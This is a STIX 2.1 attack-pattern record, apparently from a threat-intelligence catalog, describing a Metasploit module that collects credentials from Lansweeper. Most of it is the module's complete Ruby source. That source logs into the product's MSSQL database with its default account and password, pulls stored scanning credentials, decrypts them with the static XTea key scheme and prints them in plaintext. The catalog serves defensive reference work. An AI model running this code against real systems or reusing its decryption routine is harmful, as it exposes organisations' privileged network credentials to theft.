{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--72fe0738-46a8-4ea6-8495-6cb6d7831111",
    "created": "2024-08-14T16:31:28.727114Z",
    "modified": "2024-08-14T16:31:28.727118Z",
    "name": "Lansweeper Credential Collector",
    "description": "( Lansweeper stores the credentials it uses to scan the computers in its Microsoft SQL database.  The passwords are XTea-encrypted with a 68 character long key, in which the first 8 characters are stored with the password in the database and the other 60 is static. Lansweeper, by default, creates an MSSQL user \"lansweeperuser\" with the password is \"mysecretpassword0*\", and stores its data in a database called \"lansweeperdb\". This module will query the MSSQL database for the credentials. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/lansweeper_collector.rb",
            "external_id": "lansweeper_collector.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.lansweeper.com"
        },
        {
            "source_name": "reference",
            "url": "http://www.praudit.hu/prauditeng/index.php/blog/a-lansweeper-es-a-tea"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Lansweeper Credential Collector',\n      'Description' => %q(\n        Lansweeper stores the credentials it uses to scan the computers\n        in its Microsoft SQL database.  The passwords are XTea-encrypted with a\n        68 character long key, in which the first 8 characters are stored with\n        the password in the database and the other 60 is static. Lansweeper, by\n        default, creates an MSSQL user \"lansweeperuser\" with the password is\n        \"mysecretpassword0*\", and stores its data in a database called\n        \"lansweeperdb\". This module will query the MSSQL database for the\n        credentials.\n      ),\n      'Author' =>\n        [\n          'sghctoma <tamas.szakaly[at]praudit.hu>', # Lansweeper RCE + Metasploit implementation\n          'eq <balazs.bucsay[at]praudit.hu>', # Lansweeper RCE + discovering default credentials\n          'calderpwn <calderon[at]websec.mx>' # Module for lansweeper (5.3.0.8)\n        ],\n      'License' => MSF_LICENSE,\n      'DefaultOptions'  =>\n        {\n          'USERNAME' => 'lansweeperuser',\n          'PASSWORD' => 'mysecretpassword0*'\n        },\n      'References' =>\n        [\n          ['URL', 'http://www.lansweeper.com'],\n          ['URL', 'http://www.praudit.hu/prauditeng/index.php/blog/a-lansweeper-es-a-tea']\n        ]))\n\n    register_options([\n      OptString.new('DATABASE', [true, 'The Lansweeper database', 'lansweeperdb'])\n    ])\n\n  end\n\n  def uint32(n)\n    n & 0xffffffff\n  end\n\n  def xtea_decode(v, k)\n    sum = 0xc6ef3720\n    v_0 = uint32(v[0])\n    v_1 = uint32(v[1])\n\n    0.upto(0x1f) do\n      v_1 -= uint32((uint32(v_0 << 4) ^ uint32(v_0 >> 5)) + v_0) ^ uint32(sum + k[uint32(sum >> 11) & 3])\n      v_1 = uint32(v_1)\n      sum -= 0x9e3779b9\n      sum = uint32(sum)\n      v_0 -= (uint32(uint32(v_1 << 4) ^ uint32(v_1 >> 5)) + v_1) ^ uint32(sum + k[sum & 3])\n      v_0 = uint32(v_0)\n    end\n\n    v[0] = v_0\n    v[1] = v_1\n  end\n\n  def xtea_decrypt(data, key)\n    k = key.ljust(16).unpack('VVVV')\n    num = 0\n    bytes = Array.new\n\n    0.step(data.length - 1, 8) do |i|\n      v = data[i, 8].unpack('VV')\n      xtea_decode(v, k)\n      bytes[num] = v[0]\n      num += 1\n      bytes[num] = v[1]\n      num += 1\n    end\n\n    bytes.pack('c*')\n  end\n\n  def lsw_generate_pass\n    key = ''\n\n    (0..60).each do |num|\n      key << [((40 - num) + ((num * 2) + num)) - 1].pack('c')\n      key << [(num + 15) + num].pack('c')\n    end\n\n    key\n  end\n\n  def lsw_decrypt(data)\n    data = Rex::Text.decode_base64(data)\n\n    first = data[0]\n    pass = data[1, 8]\n    actual_data = data[9, data.length - 9]\n\n    decrypted = xtea_decrypt(actual_data, pass + lsw_generate_pass)\n\n    if first == '1'\n      decrypted = decrypted[0, decrypted.length - 2]\n    end\n\n    Rex::Text.to_ascii(decrypted, 'utf-16le')\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:host],\n      port: opts[:port],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id,\n      service_name: opts[:creds_name]\n    }\n\n    credential_data = {\n      username: opts[:user],\n      private_type: :password,\n      private_data: opts[:password],\n      origin_type: :service,\n      module_fullname: self.fullname\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run\n    unless mssql_login_datastore\n      fail_with(Failure::NoAccess, 'Login failed. Check credentials.')\n    end\n    result = mssql_query(\"select Credname, Username, Password from #{datastore['DATABASE']}.dbo.tsysCredentials WHERE LEN(Password)>64\", false)\n\n    result[:rows].each do |row|\"\"\n      pw = lsw_decrypt(row[2])\n\n      print_good(\"Credential name: #{row[0]} | username: #{row[1]} | password: #{pw}\")\n\n      report_cred(\n        :host => rhost,\n        :port => rport,\n        :creds_name => row[0],\n        :user => row[1],\n        :password => pw\n      )\n    end\n    disconnect\n  end\nend\n"
}